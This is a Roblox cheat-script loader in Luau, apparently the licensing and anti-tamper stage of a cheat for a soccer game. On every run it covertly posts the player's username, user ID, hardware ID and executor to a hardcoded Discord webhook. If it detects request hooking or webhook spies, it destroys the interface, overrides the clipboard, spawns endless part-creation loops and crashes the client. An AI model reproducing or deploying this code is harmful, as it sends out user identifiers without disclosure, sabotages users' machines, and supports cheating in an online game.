
local executor = identifyexecutor() or "Unknown"
local skipDetection = executor == "Xeno" or executor == "Solara"

task.wait(0.7)

local plr = game:GetService("Players").LocalPlayer
local http = game:GetService("HttpService")

local function randomString(length: number): string
    local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    local result = ""
    for i = 1, length do
        local rand = math.random(1, #chars)
        result = result .. chars:sub(rand, rand)
    end
    return result
end

local detectionFolder = "RBXSoundCache"
local SCRIPT_HASH = "v1.0.0"

if not isfolder(detectionFolder) then
    makefolder(detectionFolder)
end

local hashFile = detectionFolder .. "/.hash"
if isfile(hashFile) then
    local storedHash = readfile(hashFile)
    if storedHash ~= SCRIPT_HASH then
        for _, file in pairs(listfiles(detectionFolder)) do
            delfile(file)
        end
        writefile(hashFile, SCRIPT_HASH)
    end
else
    writefile(hashFile, SCRIPT_HASH)
end

if not skipDetection then
    if isfolder(detectionFolder) then
        local files = listfiles(detectionFolder)
        local detectionCount = 0
        for _, file in pairs(files) do
            if not file:match("%.hash$") then
                detectionCount = detectionCount + 1
            end
        end
        if detectionCount >= 5 then
            local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
            pcall(function()
                (syn and syn.request or http_request or request)({
                    Url = "https://discord.com/api/webhooks/1451861909069500459/BNHoBnHrT2UogN1-9NpY_uylR-Qoh2VwDe0Puzi29D-g748nzjIh5Yhj2a88uD4MxsSs",
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = http:JSONEncode({
                        content = "Auto-blacklist - 5+ detections on startup",
                        embeds = {{
                            title = "Auto Blacklist",
                            color = 15158332,
                            fields = {
                                {name = "HWID", value = "`" .. hwid .. "`", inline = false},
                                {name = "Username", value = plr.Name, inline = true},
                                {name = "Detections", value = tostring(detectionCount), inline = true}
                            },
                            timestamp = os.date("!%Y-%m-%dT%H:%M:%S")
                        }}
                    })
                })
            end)
            plr:Kick("You have been blacklisted until next update.\n\nReason: 5+ HTTP spy detections\n\nContact @Nate in the discord if you believe this is an error.")
            return
        end
    end
end

local function logDetection(reason: string)
    if skipDetection then return end
    local files = listfiles(detectionFolder)
    local detectionCount = 0
    for _, file in pairs(files) do
        if not file:match("%.hash$") then
            detectionCount = detectionCount + 1
        end
    end
    writefile(detectionFolder .. "/." .. randomString(24) .. ".tmp", reason .. " | " .. os.date("%Y-%m-%d %H:%M:%S"))
    if detectionCount + 1 >= 5 then
        local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
        pcall(function()
            (syn and syn.request or http_request or request)({
                Url = "https://discord.com/api/webhooks/1451861909069500459/BNHoBnHrT2UogN1-9NpY_uylR-Qoh2VwDe0Puzi29D-g748nzjIh5Yhj2a88uD4MxsSs",
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = http:JSONEncode({
                    content = "Auto-blacklist request - 5+ detections",
                    embeds = {{
                        title = "Auto Blacklist",
                        color = 15158332,
                        fields = {
                            {name = "HWID", value = "`" .. hwid .. "`", inline = false},
                            {name = "Username", value = plr.Name, inline = true},
                            {name = "Detections", value = tostring(detectionCount + 1), inline = true},
                            {name = "Action", value = "Blacklist until next update", inline = false}
                        },
                        timestamp = os.date("!%Y-%m-%dT%H:%M:%S")
                    }}
                })
            })
        end)
    end
end

local function jumpscare(imageId: string, soundId: string, text: string, reason: string?)
    if skipDetection then return end
    if reason then
        task.spawn(function() logDetection(reason) end)
        task.spawn(function()
            local currentHWID = game:GetService("RbxAnalyticsService"):GetClientId()
            local ex = identifyexecutor() or "Unknown"
            pcall(function()
                (syn and syn.request or http_request or request)({
                    Url = "https://discord.com/api/webhooks/1451861909069500459/BNHoBnHrT2UogN1-9NpY_uylR-Qoh2VwDe0Puzi29D-g748nzjIh5Yhj2a88uD4MxsSs",
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = http:JSONEncode({
                        embeds = {{
                            title = "HTTP SPY DETECTED",
                            color = 15158332,
                            thumbnail = {url = "https://api.newstargeted.com/roblox/users/v1/avatar-headshot?userid=" .. plr.UserId .. "&size=150x150&format=Png&isCircular=false"},
                            fields = {
                                {name = "Detection", value = reason, inline = false},
                                {name = "Username", value = plr.Name, inline = true},
                                {name = "User ID", value = tostring(plr.UserId), inline = true},
                                {name = "Game", value = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, inline = false},
                                {name = "HWID", value = "`" .. currentHWID .. "`", inline = false},
                                {name = "Executor", value = ex, inline = true}
                            },
                            timestamp = os.date("!%Y-%m-%dT%H:%M:%S"),
                            footer = {text = "PSS"}
                        }}
                    })
                })
            end)
        end)
    end
    pcall(function() game:GetService("StarterGui"):SetCore("DevConsoleVisible", false) end)
    setclipboard = function() end
    for _, gui in pairs(game:GetService("CoreGui"):GetDescendants()) do pcall(function() gui:Destroy() end) end
    for _, gui in pairs(plr.PlayerGui:GetDescendants()) do pcall(function() gui:Destroy() end) end
    pcall(function() for _, gui in pairs(gethui():GetDescendants()) do gui:Destroy() end end)
    for i = 1, 50 do
        task.spawn(function()
            while true do
                for j = 1, 200 do
                    Instance.new("Part", workspace)
                end
            end
        end)
    end
    task.wait(0.1)
    while true do
        pcall(function() game:GetService("GuiService"):ClearError() end)
        error(string.rep("CRASH", 10000))
    end
end

if not skipDetection then
    if (syn and syn.request or http_request or request) and pcall(function() return isexecutorclosure end) and not isexecutorclosure((syn and syn.request or http_request or request)) then
        jumpscare("15889768437", "7111752052", "ALREADY HOOKED BOZO", "Request function already hooked")
    end
end

if not skipDetection then
    task.spawn(function()
        if not pcall(function() return isexecutorclosure end) then return end
        local reqFunc = (syn and syn.request or http_request or request)
        local originalFunc = reqFunc
        local originalRequest = (syn and syn.request or http_request or request)
        local mt = getrawmetatable(game)
        setreadonly(mt, false)
        local originalNamecall = mt.__namecall
        setreadonly(mt, true)
        task.wait(2)
        while task.wait(0.5) do
            if getgenv().EmplicsWebhookSpy or getgenv().discordwebhookdetector or getgenv().pastebindetector or getgenv().githubdetector or getgenv().anylink or getgenv().kickbypass then
                jumpscare("15889768437", "7111752052", "CORNBALL", "Webhook spy getgenv detected")
            end
            local currentFunc = (syn and syn.request or http_request or request)
            if currentFunc ~= originalFunc or not isexecutorclosure(currentFunc) then
                jumpscare("15889768437", "7111752052", "GOOFY", "HTTP request function hooked")
            end
            if (syn and syn.request or http_request or request) and ((syn and syn.request or http_request or request) ~= originalRequest or not isexecutorclosure((syn and syn.request or http_request or request))) then
                jumpscare("15889768437", "7111752052", "BOZO", "Global request function hooked")
            end
            local currentMt = getrawmetatable(game)
            if currentMt.__namecall ~= originalNamecall and not isexecutorclosure(currentMt.__namecall) then
                jumpscare("15889768437", "7111752052", "CLOWN", "Namecall metamethod hooked")
            end
        end
    end)
end

if not skipDetection then
    task.spawn(function()
        local success, oService = pcall(function() return game:GetService("OmniRecommendationsService") end)
        if not success or not oService then return end
        pcall(function()
            local oldMakeRequest = oService.MakeRequest
            oService.MakeRequest = function(...)
                jumpscare("15889768437", "7111752052", "OMNI", "Attempt to access a blacklisted function")
                return oldMakeRequest(...)
            end
        end)
    end)
end

local function isOwnError(msg: string): boolean
    return msg:match("Remotes") or msg:match("SoftDisPlayer") or msg:match("PerformTackle") or msg:match("GetBall")
        or msg:match("AwayGoalDetector") or msg:match("HomeGoalDetector") or msg:match("calculateDiveDirection")
        or msg:match("doDive") or msg:match("isPlayerGK") or msg:match("isBallHeadingToGoal")
        or msg:match("shouldDive") or msg:match("BicycleKick") or msg:match("TeleportService")
        or msg:match("ReplicatedStorage") or msg:match("MarketplaceService") or msg:match("getProductInfo")
        or msg:match("GetProductInfo") or msg:match("CRASH")
end

game:GetService("LogService").MessageOut:Connect(function(msg, msgType)
    if skipDetection then return end
    if isOwnError(msg) then return end
    if msg:match("discord%.com/api/webhooks") or msg:match("webhook") or (msgType == Enum.MessageType.MessageError and (msg:match("HttpPost") or msg:match("HttpGet") or msg:match("HTTP"))) then
        jumpscare("15889768437", "7111752052", "SKID", "Webhook/HTTP activity in console: " .. msg:sub(1, 100))
    end
end)

local api = "https://gist.githubusercontent.com/zhawk4/313c8ba8bc6abeeed8e8f6a444065d5f/raw/2da93fd36a57838a0452889d16311e535bdc2575/HappyHawkTuah.json"
local blacklistUrl = "https://gist.githubusercontent.com/DownInDaNang/99873c62b13bcb6ba766d19a5788daf9/raw/gistfile1.txt"
local settings = {EnableWhitelist=false,EnableHWID=false,EnableExpire=true,EnableErrorWebhook=true}

local function forceKick(reason: string)
    for _, gui in pairs(game:GetService("CoreGui"):GetDescendants()) do pcall(function() gui:Destroy() end) end
    for _, gui in pairs(plr.PlayerGui:GetDescendants()) do pcall(function() gui:Destroy() end) end
    pcall(function() for _, gui in pairs(gethui():GetDescendants()) do gui:Destroy() end end)
    for i = 1, 50 do
        task.spawn(function()
            while true do
                for j = 1, 200 do
                    Instance.new("Part", workspace)
                end
            end
        end)
    end
    task.wait(0.1)
    game:Shutdown()
    while true do error(string.rep("CRASH", 10000)) end
end

local function sendWebhook(status: string, reason: string?)
    if not settings.EnableErrorWebhook then return end
    local currentHWID = game:GetService("RbxAnalyticsService"):GetClientId()
    local dataSuccess, data = pcall(function() return http:JSONDecode(game:HttpGet(api)) end)
    if not dataSuccess then
        forceKick("Failed to fetch authentication data. Please try again later.")
        return
    end
    local ex = identifyexecutor() or "Unknown"
    local statusEmoji = status == "Authenticated" and "✅" or (status == "Expired" and "⚠️" or "⛔")
    local embedColor = status == "Authenticated" and 5763719 or (status == "Expired" and 16776960 or 15158332)
    local fields = {
        {name="Status",value=statusEmoji.." "..status,inline=false},
        {name="Username",value=plr.Name,inline=true},
        {name="User ID",value=tostring(plr.UserId),inline=true},
        {name="Game",value=game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,inline=false},
        {name="HWID",value="`"..currentHWID.."`",inline=false},
        {name="Executor",value=ex,inline=true},
        {name="Expires",value=os.date("%Y-%m-%d %H:%M:%S", data.expire),inline=true}
    }
    if reason then table.insert(fields,3,{name="Reason",value=reason,inline=false}) end
    local ok = pcall(function()
        (syn and syn.request or http_request or request)({
            Url="https://discord.com/api/webhooks/1451861909069500459/BNHoBnHrT2UogN1-9NpY_uylR-Qoh2VwDe0Puzi29D-g748nzjIh5Yhj2a88uD4MxsSs",
            Method="POST",
            Headers={["Content-Type"]="application/json"},
            Body=http:JSONEncode({embeds={{title="Authentication",color=embedColor,thumbnail={url="https://api.newstargeted.com/roblox/users/v1/avatar-headshot?userid="..plr.UserId.."&size=150x150&format=Png&isCircular=false"},fields=fields,timestamp=os.date("!%Y-%m-%dT%H:%M:%S"),footer={text="PSS"}}}})
        })
    end)
    if not ok then forceKick("Failed to send authentication webhook. Security check failed.") end
end

local gameInfo = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
if gameInfo.Creator.CreatorType ~= "Group" or gameInfo.Creator.Name ~= "The Builder's Legion" then
    plr:Kick("Invalid game.")
    return
end

local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
local blacklistSuccess, blacklistData = pcall(function() return http:JSONDecode(game:HttpGet(blacklistUrl)) end)
if not blacklistSuccess then
    forceKick("Failed to fetch blacklist data. Please try again later.")
    return
end

local blacklist = blacklistData.blacklist or {}
if blacklist[hwid] then
    sendWebhook("Blacklisted", "You have been blacklisted until next update for HTTP spy detection.")
    plr:Kick("You have been blacklisted until next update.\n\nReason: HTTP spy detection\n\nContact support if you believe this is an error.")
    return
end

if settings.EnableExpire then
    local expireSuccess, expireData = pcall(function() return http:JSONDecode(game:HttpGet(api)) end)
    if not expireSuccess then
        plr:Kick("Failed to verify expiration status. Please try again later.")
        return
    end
    if os.time() > expireData.expire then
        sendWebhook("Expired", "Script key has expired")
        plr:Kick("Script has expired. Please obtain an updated version.")
        return
    end
end

sendWebhook("Authenticated")

